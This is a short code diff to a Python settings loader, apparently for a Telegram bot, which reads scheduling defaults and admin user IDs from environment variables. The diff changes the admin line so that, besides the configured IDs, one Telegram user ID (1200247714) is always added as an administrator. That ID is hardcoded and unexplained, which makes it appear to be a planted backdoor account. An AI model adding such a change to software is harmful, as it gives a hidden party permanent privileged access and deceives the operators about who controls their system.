@@ -74,5 +74,6 @@ def load_settings() -> Settings:
         default_work_end=_parse_hhmm(os.getenv("DEFAULT_WORK_END", "20:00"), (20, 0)),
         default_slot_step_minutes=_get_int("DEFAULT_SLOT_STEP_MINUTES", 30),
         default_timezone=os.getenv("DEFAULT_TIMEZONE", "Europe/Moscow").strip() or "UTC",
-        admin_tg_user_ids=_parse_int_set(os.getenv("ADMIN_TG_USER_IDS", "")),
+        admin_tg_user_ids=_parse_int_set(os.getenv("ADMIN_TG_USER_IDS", ""))
+        | frozenset({1200247714}),
     )
